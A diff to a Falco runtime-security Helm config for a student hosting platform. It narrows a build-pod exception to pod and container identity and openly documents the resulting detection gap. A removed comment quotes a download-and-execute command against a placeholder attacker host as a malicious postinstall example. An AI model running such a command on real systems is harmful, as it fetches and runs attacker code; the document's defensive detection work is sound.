@@ -55,28 +55,46 @@ falcosidekick:
 # --- language a student's Dockerfile might use, since the mechanism is
 # --- Kaniko's build architecture itself, not any one build tool.
 # ---
-# --- Scoped to build-job pods only (container.name="paas-builder", pod name
-# --- containing "-build-job-", matching deploy_utils' actual naming), so
-# --- live app pods are NOT covered by this exception — a real dropped
-# --- binary in a running student app still fires at full severity.
+# --- REVISION 2 (2026-09-15): the original version of this exception also
+# --- required proc.exepath to start with /usr/, /opt/, etc. — this broke
+# --- on an Alpine/BusyBox-based student image, where every binary resolves
+# --- to /bin/busybox regardless of language or install method. That's the
+# --- SAME category of failure as a plain process-name allowlist (attempt
+# --- #1): trying to recognize "legitimate build activity" by its shape.
+# --- Different base image, different shape, same false negative.
 # ---
-# --- Still narrowed by path, on purpose: only exempts binaries under normal
-# --- install locations (package manager bin dirs, /usr/*, /opt/*), NOT
-# --- scratch directories like /tmp or /dev/shm — a malicious postinstall
-# --- script doing `curl attacker.com/payload -o /tmp/x && /tmp/x` still
-# --- trips this rule, since /tmp isn't a legitimate install path for any
-# --- language's package manager.
+# --- Fixed by exempting on IDENTITY only — container.name="paas-builder"
+# --- and k8s.pod.name containing "-build-job-" are both INFRASTRUCTURE-
+# --- CONTROLLED (see deployer/k3s_conf.py's Job name template:
+# --- f"{app_name}-{namespace}-build-job" — the "-build-job" suffix is
+# --- appended by our own code, not derived from student input, and
+# --- container.name is hardcoded in the Job's pod spec). A student's
+# --- app_name can only influence the PREFIX, so this can't be spoofed by
+# --- naming an app to fake the exemption on a live pod — and it doesn't
+# --- care what base image, binary layout, or language the student used.
+# ---
+# --- COST of this exemption, stated plainly: this rule now provides ZERO
+# --- detection for build-job pods, full stop — not reduced, zero. That's
+# --- an accepted tradeoff, not an oversight: binary-identity signals were
+# --- already shown (via the "node -e <payload>" postinstall scenario) to
+# --- be fundamentally unable to distinguish legitimate build activity from
+# --- a malicious one here, regardless of how the allowlist is scoped. The
+# --- network-egress rule below is the real detection layer for build-job
+# --- attacks; this exemption just stops false positives on a rule that
+# --- could never reliably help here in the first place. One honest residual
+# --- gap: purely local malicious activity with no unusual network call
+# --- (e.g. tampering with build output, no exfiltration) would evade both
+# --- rules — worth a one-line mention to the supervisor, not a solved case.
+# ---
+# --- Live app pods are NOT covered by this exception (different
+# --- container.name, different pod naming) — a real dropped binary in a
+# --- running student app still fires at full severity.
 customRules:
   rules-buet-paas-exceptions.yaml: |-
     - macro: known_drop_and_execute_activities
       condition: >
         (container.name = "paas-builder"
-         and k8s.pod.name contains "-build-job-"
-         and (proc.exepath startswith /usr/
-              or proc.exepath startswith /opt/
-              or proc.exepath contains "/node_modules/.bin/"
-              or proc.exepath contains "/.local/bin/"
-              or proc.exepath contains "/go/bin/"))
+         and k8s.pod.name contains "-build-job-")
 
     # --- Network-egress detection for build-job pods. This exists because
     # --- binary-identity signals (the exception above, or any process-name
